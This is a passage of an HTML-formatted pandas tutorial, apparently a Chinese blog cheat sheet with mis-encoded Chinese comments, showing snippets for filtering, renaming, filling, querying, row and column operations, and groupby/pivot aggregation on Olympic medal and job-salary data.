class="keyword">return</span> <span class="string">&#x27;On&#x27;</span></span><br><span class="line"><span class="comment"># åº”ç”¨applyå‡½æ•°</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿ç•™2ä½å°æ•°ï¼Œå¦‚23.12%</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>)</span><br><span class="line"><span class="comment"># åº”ç”¨è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line">ratio=ratio[<span class="string">&#x27;Austin - EV&#x27;</span>].apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘ä»¬å°†ä¼šç”¨åˆ° transform è€Œä¸æ˜¯ applyã€‚ åŸå› æ˜¯ï¼Œ transform å°†ä¼šä¿æŒ dataframe çŸ©é˜µçš„å½¢çŠ¶(shape)(å°±æ˜¯è¡Œåˆ—æ•°ä¸å˜)è€Œ apply ä¼šæ”¹å˜çŸ©é˜µçš„å½¢çŠ¶ã€‚</span></span><br></pre></td></tr></table></figure><h3><span id="é‡é‡‡æ ·">é‡é‡‡æ ·</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡é‡‡æ ·</span></span><br><span class="line">df[<span class="string">&#x27;è´­ä¹°æœˆä»½&#x27;</span>] = pd.to_datetime(df.æ—¥æœŸ).dt.to_period(<span class="string">&quot;M&quot;</span>)</span><br></pre></td></tr></table></figure><h3><span id="del">del</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> df[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df.drop(<span class="string">&#x27;a&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="æŒ‰æ—¶é—´ç­›é€‰">æŒ‰æ—¶é—´ç­›é€‰</span></h3><ul><li>ç¬¬ä¸€ç§</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†DateTimeè½¬æˆæ—¥æœŸæ ¼å¼</span></span><br><span class="line">df[<span class="string">&#x27;DateTime&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;DateTime&#x27;</span>])</span><br><span class="line"><span class="comment"># å°†æ—¥æœŸè®¾ä¸ºindex</span></span><br><span class="line">df = df.set_index(<span class="string">&#x27;DateTime&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­›é€‰ä»2019å¹´3æœˆ1å·åˆ°2019å¹´3æœˆ10å·æ•´åå¤©çš„ç”µç½‘æ•°æ®</span></span><br><span class="line">df1 = df[<span class="string">&#x27;2019-03-01&#x27;</span>:<span class="string">&#x27;2019-03-10&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>ç¬¬äºŒç§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># è®¾ç½®å¼€å§‹æ—¶é—´</span><br><span class="line">from_date = df[&#x27;DATA_DATE&#x27;]&gt;=&#x27;2021-01-01&#x27;</span><br><span class="line"># è®¾ç½®ç»“æŸæ—¶é—´</span><br><span class="line">to_date = df[&#x27;DATA_DATE&#x27;]&lt;=&#x27;2021-03-31&#x27;</span><br><span class="line"># ç­›é€‰æ•°æ®æ—¶é—´æ®µ</span><br><span class="line">df = df[from_date&amp;to_date]</span><br></pre></td></tr></table></figure></li></ul><h3><span id="æ˜¾ç¤ºä¸­æ–‡">æ˜¾ç¤ºä¸­æ–‡</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># winè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># macè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;Heiti TC&#x27;</span><span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br></pre></td></tr></table></figure><h3><span id="é‡å‘½å">é‡å‘½å</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å‘½å åˆ—</span></span><br><span class="line">q4_df.rename(columns=&#123;<span class="string">&#x27;AT_HOME&#x27;</span>:<span class="string">&#x27;empty_ratio&#x27;</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># é‡å‘½å ç´¢å¼•</span></span><br><span class="line">df.rename_axis(<span class="string">&quot;é‡‘ç‰Œæ’å&quot;</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="å¡«å……">å¡«å……</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">bfill ä»åé¢å¾€å‰å¡«å……</span></span><br><span class="line"><span class="string">ffill ä»å‰å¾€å</span></span><br><span class="line"><span class="string">é»˜è®¤åˆ—æ–¹å‘å¡«å……0ï¼Œ1ä½¿ç”¨è¡Œæ–¹å‘</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å¢ä¸€åˆ— æœ€å¤šå¥–ç‰Œæ•°é‡ åˆ—ï¼Œå€¼ä¸ºè¯¥å›½ é‡‘ã€é“¶ã€é“œ ç‰Œæ•°é‡ä¸­æœ€å¤šçš„ä¸€ä¸ªå¥–ç‰Œæ•°é‡</span></span><br><span class="line">df[<span class="string">&#x27;æœ€å¤šå¥–ç‰Œæ•°é‡&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;é‡‘ç‰Œæ•°&quot;</span>, <span class="string">&quot;é“¶ç‰Œæ•°&quot;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="æŸ¥è¯¢">æŸ¥è¯¢</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df[df.å›½å®¶å¥¥å§”ä¼š.<span class="built_in">str</span>.contains(<span class="string">&#x27;å›½&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].isin([<span class="string">&#x27;å·¥ä¸š&#x27;</span>,<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å·¥ä¸š&#x27;</span>)|(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;å·¥ä¸š|å»ºç­‘ä¸š&#x27;</span>)]</span><br></pre></td></tr></table></figure><h3><span id="é€‰æ‹©ç±»å‹">é€‰æ‹©ç±»å‹</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®å±•å¼€">æ•°æ®å±•å¼€</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df5.explode([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®ç´¯åŠ ">æ•°æ®ç´¯åŠ </span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum()</span><br><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="åˆ—æ“ä½œ">åˆ—æ“ä½œ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ’å…¥åˆ—</span></span><br><span class="line">tmp3 = (df[<span class="string">&#x27;æ˜¥èŠ‚æœŸé—´ï¼ˆé™¤å¤•è‡³åˆå…­ï¼‰ç”¨ç”µé‡&#x27;</span>]-df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>])/df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line">df.columns=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">df</span><br><span class="line"><span class="comment"># åˆ é™¤åˆ—</span></span><br><span class="line">df.drop(<span class="string">&#x27;rate&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ–°å¢åˆ—</span></span><br><span class="line">df[<span class="string">&#x27;æ¯”èµ›åœ°ç‚¹&#x27;</span>] = <span class="string">&#x27;ä¸œäº¬&#x27;</span></span><br><span class="line"><span class="comment"># æ–°å¢ä¸€åˆ— æœ€å¤šå¥–ç‰Œæ•°é‡ åˆ—ï¼Œå€¼ä¸ºè¯¥å›½ é‡‘ã€é“¶ã€é“œ ç‰Œæ•°é‡ä¸­æœ€å¤šçš„ä¸€ä¸ªå¥–ç‰Œæ•°é‡ ä¾‹å¦‚ç¾å›½é“¶ç‰Œæœ€å¤šï¼Œåˆ™ä¸º41ï¼Œä¸­å›½ä¸º38 bfillé»˜è®¤è·¨è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;æœ€å¤šå¥–ç‰Œæ•°é‡&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;é‡‘ç‰Œæ•°&quot;</span>, <span class="string">&quot;é“¶ç‰Œæ•°&quot;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># å¦‚æœä¸€ä¸ªå›½å®¶çš„é‡‘ç‰Œæ•°å¤§äº 30 åˆ™å€¼ä¸º æ˜¯ï¼Œåä¹‹ä¸º å¦</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œå¤§äº30&#x27;</span>]  = np.where(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &gt; <span class="number">30</span>, <span class="string">&#x27;æ˜¯&#x27;</span>, <span class="string">&#x27;å¦&#x27;</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ df çš„ 7ã€8ã€9ã€10 åˆ—</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># æå–ç¬¬1ï¼Œ2ï¼Œ3ï¼Œ4åˆ—</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•°ã€é“¶ç‰Œæ•°ã€é“œç‰Œæ•° ä¸‰åˆ—</span></span><br><span class="line">df[[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“¶ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]]</span><br><span class="line"><span class="comment"># æå–å…¨éƒ¨åˆ—åä¸­ä»¥ â€œæ•°â€ ç»“å°¾çš„åˆ—</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;æ•°&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="è¡Œæ“ä½œ">è¡Œæ“ä½œ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ’å…¥è¡Œ å…ˆåˆ‡åˆ†å†æ’å…¥</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ç¬¬ä¸€è¡Œ</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ¡ä»¶åˆ é™¤</span></span><br><span class="line">df.drop(df[df.é‡‘ç‰Œæ•°&lt;<span class="number">20</span>].index)</span><br><span class="line"><span class="comment"># æå–å€’æ•°åä¸‰åˆ—çš„10-20è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,-<span class="number">3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">&#x27;æ€»åˆ†&#x27;</span>:] </span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œ </span></span><br><span class="line"><span class="comment"># DataFrameæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Seriesæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œä¹‹åçš„å…¨éƒ¨è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line">df.loc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># æå– 0-50 è¡Œï¼Œé—´éš”ä¸º 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•° ä¸ç­‰äº 10 çš„è¡Œ</span></span><br><span class="line">df.loc[~(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># æå–å¥‡æ•°è¡Œ</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.index))]]</span><br><span class="line"><span class="comment"># æå– ä¸­å›½ã€ç¾å›½ã€è‹±å›½ã€æ—¥æœ¬ã€å·´è¥¿ äº”è¡Œæ•°æ® ä¸” é‡‘ç‰Œæ•°å°äº30</span></span><br><span class="line">df.loc[(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">&#x27;å›½å®¶å¥¥å§”ä¼š&#x27;</span>].isin([<span class="string">&#x27;ä¸­å›½&#x27;</span>,<span class="string">&#x27;ç¾å›½&#x27;</span>,<span class="string">&#x27;è‹±å›½&#x27;</span>,<span class="string">&#x27;æ—¥æœ¬&#x27;</span>,<span class="string">&#x27;å·´è¥¿&#x27;</span>]))]</span><br><span class="line"><span class="comment"># åŒ…å«æŸä¸ªå­—çš„è¡Œ</span></span><br><span class="line">df[df.å›½å®¶å¥¥å§”ä¼š.<span class="built_in">str</span>.contains(<span class="string">&#x27;å›½&#x27;</span>)]</span><br><span class="line"><span class="comment"># æå– ç¬¬ 0-2 è¡Œç¬¬ 0-2 åˆ—</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° + é“¶ç‰Œæ•° å¤§äº 15 çš„å›½å®¶</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ query æå– é‡‘ç‰Œæ•° å¤§äº é‡‘ç‰Œå‡å€¼çš„å›½å®¶</span></span><br><span class="line">gold_mean = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].mean()</span><br><span class="line">df.query(<span class="string">f&#x27;é‡‘ç‰Œæ•° &gt; <span class="subst">&#123;gold_mean&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‡å®šä½ç½®æ’å…¥è¡Œ</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># è°ƒæ•´ é¡ºåº</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="pivotä¸groupby">pivotä¸groupby</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>])</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>]]</span><br></pre></td></tr></table></figure><h3><span id="unstack">unstack</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®—å‰ååå„å›½æ¯æ—¥å¥–ç‰Œæ•°é‡åˆè®¡</span></span><br><span class="line"><span class="comment"># æ³¨æ„ï¼šå¯¹äºç¬¬ä¸€å¤©æ²¡æœ‰æ•°æ®çš„å›½å®¶ç”¨0å¡«å……ï¼Œå…¶ä½™æ—¶é—´çš„ç¼ºå¤±å€¼ç”¨ä¸Šä¸€æ—¥æ•°æ®å¡«å……</span></span><br><span class="line">countries = df2.groupby(<span class="string">&#x27;å›½å®¶&#x27;</span>).count().sort_values(<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">&#x27;å›½å®¶&#x27;</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>,<span class="string">&#x27;å›½å®¶&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®èšåˆ">æ•°æ®èšåˆ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ†ç»„ï¼Œä½†ä¸ä½œä¸ºç´¢å¼•</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, as_index=<span class="literal">False</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># åˆ†ç»„ç»Ÿè®¡</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()</span><br><span class="line"><span class="comment"># æˆ–è€…groupbyä¸¤ä¸ª</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>])[<span class="string">&#x27;companySize&#x27;</span>].count()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹groupçš„ç»“æœ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).groups</span><br><span class="line"><span class="comment"># å°†æ•°æ®æŒ‰ç…§ districtã€salary è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹è¥¿æ¹–åŒºè–ªèµ„ä¸º 30000 çš„å·¥ä½œ</span></span><br><span class="line">df.groupby([<span class="string">&quot;district&quot;</span>,<span class="string">&#x27;salary&#x27;</span>]).get_group((<span class="string">&quot;è¥¿æ¹–åŒº&quot;</span>,<span class="number">30000</span>))</span><br><span class="line"><span class="comment"># è®¡ç®—ä¸åŒè¡Œæ”¿åŒº(district)ï¼Œä¸åŒè§„æ¨¡å…¬å¸(companySize)å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">pd.DataFrame(df.groupby(<span class="string">&quot;district&quot;</span>)[<span class="string">&#x27;companySize&#x27;</span>].value_counts()) <span class="comment">#ä½¿ç”¨value_countsçš„æ–¹å¼ï¼Œæœ‰æ—¶å€™æ¯”ä¸¤ä¸ªgroupbyå¥½ç”¨</span></span><br><span class="line">df.groupby([<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;companySize&#x27;</span>]).count().iloc[:,<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"><span class="comment"># åˆ†ç»„</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby([df[<span class="string">&#x27;workYear&#x27;</span>], df[<span class="string">&#x27;education&#x27;</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">&#x27;workYear&#x27;</span>, <span class="string">&#x27;education&#x27;</span>]).mean()[<span class="string">&#x27;salary&#x27;</span>]</span><br><span class="line"><span class="comment"># 